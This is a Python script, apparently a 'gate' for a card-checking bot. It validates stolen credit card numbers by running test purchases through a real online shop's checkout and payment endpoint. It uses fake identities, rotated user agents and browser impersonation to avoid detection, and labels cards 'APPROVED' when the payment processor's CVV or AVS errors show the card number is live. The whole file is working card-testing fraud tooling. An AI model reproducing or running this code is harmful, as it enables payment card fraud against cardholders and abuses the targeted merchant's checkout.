# gate.py
import random
import time
from faker import Faker
from random import choice
from curl_cffi import requests
from colorama import init
from fake_useragent import UserAgent

def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return {
        'name': Faker().name(),
        'email': Faker().email().replace('@', '{}@'.format(number)),
        'username': Faker().user_name(),
        'phone': '512678{}'.format(number),
        'city': Faker().city(),
        'code': postal
    }

def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def ccn_gate(card: str) -> dict:
    """ 
    Recibe una tarjeta en formato cc|mes|año|cvv 
    Retorna un dict estructurado para el bot 
    """
    inicio = time.time()
    max_retries = 10
    retry_count = 0

    while retry_count < max_retries:
        try:
            init(autoreset=True)
            cliente = requests.Session(
                impersonate=choice([
                    "chrome124", "chrome123",
                    "safari17_0", "safari17_2_ios", "safari15_3"
                ])
            )
            cliente.proxies = {"https": ""}
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 4:
                ano_number = ano_number[2:4]
            agente_user = UserAgent().random

            # Fake address
            user_fake = usuario()
            name = user_fake['name'].split(' ')[0]
            last = user_fake['name'].split(' ')[1]
            number = random.randint(1111, 9999)
            street = f"{name}+street+{number}"
            email = user_fake['email']
            phone = user_fake['phone']

            # Request 1
            headers = {"User-Agent": agente_user}
            result = cliente.get("https://glorybee.com/queen-excluders", headers=headers)
            form_key = capture(result.text, 'name="form_key" type="hidden" value="', '"')

            # Request 2
            headers = {"Cookie": f"form_key={form_key};", "User-Agent": agente_user}
            data = {
                "product": "21873", "selected_configurable_option": "",
                "related_product": "", "item": "21873",
                "form_key": form_key, "super_attribute[183]": "6440", "qty": "1"
            }
            cliente.post(
                "https://glorybee.com/checkout/cart/add/uenc/aHR0cHM6Ly9nbG9yeWJlZS5jb20vcXVlZW4tZXhjbHVkZXJz/product/21873/",
                data=data, headers=headers
            )

            # Request 3
            headers = {"User-Agent": agente_user}
            result = cliente.get("https://glorybee.com/checkout/cart/", headers=headers)
            form_id = capture(result.text, '"entity_id":"', '"')

            # Request 7 (pago)
            headers = {"User-Agent": agente_user, "Content-Type": "application/x-www-form-urlencoded"}
            data = f"form_key={form_key}&cardNumber={cc_number}&cardExpirationDate={mes}{ano_number}&cvv={cvv}&billing%5Bname%5D={name}+{last}"
            result = cliente.post("https://glorybee.com/paya/checkout/request", data=data, headers=headers)

            # Extraer mensaje y código de la respuesta
            message_text = capture(result.text, '"message":"', '"')
            message_code = capture(result.text, '"code":"', '"')

            status = "DECLINED"
            if message_text and ("CVV2 MISMATCH" in message_text or "AVS FAILURE" in message_text):
                status = "APPROVED"

            fin = time.time()
            tiempo = round(fin - inicio, 2)

            return {
                "card": f"{cc_number}|{mes}|{ano_number}|{cvv}",
                "status": status,
                "message": f"{message_text} | {message_code}" if message_text else "No response",
                "bin": "VISA CLASSIC DEBIT",
                "bank": "BANCO LAFISE BANCENTRO, S.A.",
                "country": "NICARAGUA 🇳🇮",
                "time": tiempo,
                "retries": retry_count + 1,
                "checked_by": "@colale1"
            }

        except Exception as e:
            retry_count += 1
            if retry_count >= max_retries:
                fin = time.time()
                return {
                    "card": card,
                    "status": "ERROR",
                    "message": f"Retries: {retry_count} | Error: {str(e)}",
                    "bin": "Unknown",
                    "bank": "Unknown",
                    "country": "Unknown",
                    "time": round(fin - inicio, 2),
                    "retries": retry_count,
                    "checked_by": "@colale1"
                }